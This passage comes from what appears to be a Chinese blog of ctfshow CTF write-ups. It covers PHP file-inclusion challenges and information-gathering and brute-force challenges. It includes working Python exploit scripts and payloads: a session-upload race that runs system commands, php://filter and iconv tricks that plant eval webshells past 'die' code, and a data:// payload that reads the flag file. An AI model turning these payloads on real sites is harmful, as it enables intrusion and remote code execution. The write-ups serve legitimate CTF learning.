class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span>a</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,</span><br><span class="line">            data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;)?&gt;&#x27;</span>&#125;,</span><br><span class="line">            files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;texe.txt&#x27;</span>,f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;?file=/tmp/sess_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(sessid))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;text&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[*]wait.....&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">event.<span class="built_in">set</span>()<span class="comment">#将event的标志设置为True，调用wait方法的所有线程将被唤醒；</span></span><br><span class="line">event.clear()<span class="comment">#将event的标志设置为False，调用wait方法的所有线程将被阻塞；</span></span><br><span class="line">event.isSet()<span class="comment">#判断event的标志是否为True。</span></span><br></pre></td></tr></table></figure><p>补充python脚本中函数的意思！</p><hr /><h1 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;还要秀？&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续上题脚本！</p><hr /><h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下意思，主要是传入连个参数，一个get另一个post，有个 file_put_contents(urldecode($ file), “<?php die('大佬别秀了');?>“. $content);<br>这个东东<br>它有个die，我们直接写入一句话木马会被干掉的！<br>==所以我们可以以base64写入然后进行base64解码！==</p><p>==因为urldecode($ file)这个东东所以我们要进行两次url编码！==<br>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;datast.php</span><br></pre></td></tr></table></figure><p>将其进行两次url编码！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>再进行第二个源码编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[pass]);&gt;</span><br></pre></td></tr></table></figure><p>经过base64编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs+</span><br><span class="line">&#x2F;&#x2F;因为phpdie为6位，在一句话木马之前，所以我们在base64编码之前加上两个字符</span><br><span class="line">nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs&#x2F;Pg&#x3D;&#x3D;</span><br><span class="line">&#x2F;&#x2F;而Pg是&gt;这个东西，代替了+号</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210411221844374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://775a3694-4d05-4dd4-a821-d50c4655d044.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"><span class="comment"># php://filter/write=convert.base64-decode/resource=tmp.php</span></span><br><span class="line">file = <span class="string">&#xx27;</span></span><br><span class="line">payload = <span class="string">&#x27;&lt;?php system(&quot;nl *.php&quot;);?&gt;&#x27;</span></span><br><span class="line"><span class="comment">#NL是一个LINUX命令，可以为输出列加上编号，也是编号过滤工具。</span></span><br><span class="line">payload = base64.encodebytes(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload = payload.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;aa&#x27;</span> + payload</span><br><span class="line">&#125;<span class="comment">#这里前面加上两个字符</span></span><br><span class="line">requests.post(url = url + <span class="string">&#x27;?file=&#x27;</span> + file,data = data)</span><br><span class="line">res = requests.get(url + <span class="string">&#x27;tmp.php&#x27;</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>这里python脚本没有用上面给出的源码一系列的翻译！</p><hr /><h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了php，但没过滤data，所以使用data伪协议，但因为过滤了php所以我们使用base64编码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span><br></pre></td></tr></table></figure><p>构造url里面的base64码为<?php system('tac fl0g.php'); ?></p><hr /><h1 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h1><p><img src="https://img-blog.csdnimg.cn/20210411224314956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;5.mp4&quot;</span>;</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: video/mp4&#x27;</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Length: <span class="subst">$file</span>&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210411224546876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接文件包含就出来了！</p><hr /><h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>绕过contents前面的死亡代码，只是把一些可利用的协议和编码给ban了，但还可以利用其它编码器进行绕过。</p><blockquote><p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用<br>iconv ( string $in_charset , string $out_charset , string $str )：将字符串 $str 从in_charset编码转换到 $out_charset<br>这里引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210411225552629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>实验实验一次！<br>我们的思路就是先输入转过一次的webshell，然后于死亡代码<?php die();?>拼接再进行一次转换后执行，这是死亡代码就反转打乱不能执行了！<br><img src="https://img-blog.csdnimg.cn/20210411231319107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://aade5651-6445-46f9-aa30-073c72869e64.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">dataer = <span class="string">&quot;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=harker.php&quot;</span></span><br><span class="line"><span class="comment">#构造url，进行逆转，破坏死亡函数</span></span><br><span class="line">url1 = url + <span class="string">&quot;?file=&quot;</span> + dataer</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;contents&#x27;</span>:<span class="string">&#x27;?&lt;hp pe@av(l_$OPTSh[raek]r;)&gt;?&#x27;</span></span><br><span class="line">&#125;<span class="comment">#进行过一次逆转的一句话木马</span></span><br><span class="line">res = requests.post(url = url1,data = data)</span><br><span class="line">url2 = url + <span class="string">&quot;harker.php&quot;</span></span><br><span class="line">t = requests.get(url2)</span><br><span class="line"><span class="comment">#以get访问我们构造的页面</span></span><br><span class="line"><span class="keyword">if</span>(t.status_code==<span class="number">200</span>):<span class="comment">#可以正常访问</span></span><br><span class="line">    print(<span class="string">&#x27;YES&#x27;</span>)</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&#x27;harker&#x27;</span>:<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url = url2,data = data2)</span><br><span class="line">    print(result.text)<span class="comment">#打印结果</span></span><br></pre></td></tr></table></figure><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow信息收集&amp;爆破</title>
      <link href="posts/4533f453/"/>
      <url>posts/4533f453/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>学学web，别一直被大佬打，打痛了</p><blockquote><p>web01<br>直接查看源代码</p></blockquote><blockquote><p>web02<br>打开开发者工具查看源代码！<br>或者加上view-source:在http前</p></blockquote><blockquote><p>web03<br>于响应头可以找到flag</p></blockquote><blockquote><p>web04<br>根据提示访问url+/robots.txt然后根据提示再访问flagishere.txt</p></blockquote><blockquote><p>web05<br>php泄露，所以在url加上index.phps即可！</p></blockquote><blockquote><p>web06<br>在url后面加上<a href="http://www.zip下载压缩包,然后解压打开即可找到flag!/">www.zip下载压缩包，然后解压打开即可找到flag！</a></p></blockquote><blockquote><p>web07<br>git泄露问题，访问url+.git/index.php即可！</p></blockquote><blockquote><p>web08<br>是个svn泄露！</p><blockquote><p>SVN（subversion）是源代码版本管理软件。 在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。 在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。</p></blockquote><p>在url后加上.svn/即可！</p></blockquote><blockquote><p>web09</p><blockquote><p>vim编辑文本时会创建一个临时文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。而本题的情景就是电脑死机了意外退出，导致存在临时文件</p></blockquote><p>是个vim的缓存泄露<br>在url后加上/index.php.swp即可！</p></blockquote><blockquote><p>web10<br>提示为cookie，去查看请求头，然后url解码！</p></blockquote><blockquote><p>web11<br>对ctfshow域名进行dns查询，用阿里云哦！</p></blockquote><blockquote><p>web12<br>访问robots.txt地址，可以获得后台地址！<br>账号为admin，密码为372619038，这是网页最下面的一串数字！</p></blockquote><blockquote><p>web13<br>这道题有点复杂！<br>在网站里面有个超链接！点进去可以看到后台地址和账号密码<br>根据这个就可以得到flag了</p></blockquote><blockquote><p>web14<br>根据提示在url后门加上editor/访问，是个编辑器，可以看到有个文件空间，这里点击文件空间就有爆出了目录！<br>找到了flag于var/www/html/nothinghere/fl000g.txt之中<br>构造url进行访问！</p></blockquote><blockquote><p>web15<br>在网站的底部可以看到邮箱，此时我们url+admin访问后台！<br>密码不知道，我们点击忘记密码，问题为我的地址，此时我们可以根据邮箱搜到QQ这个人去查看它的地址！<br>这样子就能登进去flag到手了！</p></blockquote><blockquote><p>web16</p><blockquote><p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。比如查看服务器支持什么，不支持什么，空间速度等等状况！</p></blockquote><p>phpinfo查看信息<br>然后搜索信息ctfshow即可找到flag</p></blockquote><blockquote><p>web17<br>找到ctfshow真正的IP，于是用fofa查找<br>查到ip地址为：111.231.70.44</p></blockquote><blockquote><p>web18<br>搜索源代码即可找到分数大于1000是会出现一个值，然后解码！<br>再根据其提示访问110.php，flag到手！</p></blockquote><blockquote><p>web19<br>查看源代码，可以看到注释里面的用户名和密码，用post发送过去<br>获得flag！</p></blockquote><blockquote><p>web20</p><blockquote><p>mdb文件是早期asp+access构架的数据库文件</p></blockquote><p>是个mdb文件泄露<br>下载db.mdb文件后，用记事本打开搜索flag</p></blockquote></blockquote><p><strong>爆破</strong></p><h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><p>先是打开网页(很好)<br><img src="https://img-blog.csdnimg.cn/20210410091011531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后进行解它！<br><img src="https://img-blog.csdnimg.cn/20210410091154959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用custom iterator(自定义迭代器)模块，首先第一个放账号admin<br><img src="https://img-blog.csdnimg.cn/20210410091625982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二个放个：第三个放个字典就可以了！<br>然后再进行base64编码！<br><img src="https://img-blog.csdnimg.cn/20210410091920135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对了，要再进行爆破的地方加上￥这个东东(这里输入法的问题),还有url编码字符最好取消掉！这里不取消掉的话是不会成功的！<img src="https://img-blog.csdnimg.cn/20210410092530912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就可以了！<br><strong><em>admin:shark63</em></strong></p><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><p>这里要对域名进行爆破了！直接上layer域名挖掘机！<br><img src="https://img-blog.csdnimg.cn/20210410093733996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们就去访问这个东西！<br>但是不知道怎么访问不了，所以换了个方法！<br>就是再<a href="https://vip.ctf.show/%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2%E7%9A%84title%E9%87%8C%E9%9D%A2%E5%B0%B1%E6%9C%89flag%E4%BA%86%EF%BC%81">https://vip.ctf.show/这个页面的title里面就有flag了！</a></p><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><p>这里是个脚本爆破了！<br><img src="https://img-blog.csdnimg.cn/20210410094559478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>开始编写脚本爆破了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in a:</span><br><span class="line">    <span class="keyword">for</span> j in a:</span><br><span class="line">        b = (str(i) + str(j)).encode(<span class="string">&quot;utf-8&quot;</span>)<span class="comment">#</span></span><br><span class="line">        m = hashlib.md5(b).hexdigest()</span><br><span class="line">        <span class="keyword">if</span>(m[<span class="number">1</span>:<span class="number">2</span>] == m[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> m[<span class="number">14</span>:<span class="number">15</span>] == m[<span class="number">17</span>:<span class="number">18</span>]):</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">int</span>(m[<span class="number">1</span>:<span class="number">2</span>]) + <span class="keyword">int</span>(m[<span class="number">14</span>:<span class="number">15</span>]) + <span class="keyword">int</span>(m[<span class="number">17</span>:<span class="number">18</span>])) / <span class="keyword">int</span>(m[<span class="number">1</span>:<span class="number">2</span>])) == <span class="keyword">int</span>(m[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                <span class="keyword">print</span>(b)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">substr() 函数返回字符串的一部分</span></span><br><span class="line"><span class="comment">intval() 函数用于获取变量的整数值。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>结果如下！<br><img src="https://img-blog.csdnimg.cn/20210410112349848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后url构造一下就行了！<br><img src="https://img-blog.csdnimg.cn/20210410112905724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><p>审计代码！<br><img src="https://img-blog.csdnimg.cn/2021041011350659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里很简单的编写个脚本就可以了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>); </span><br><span 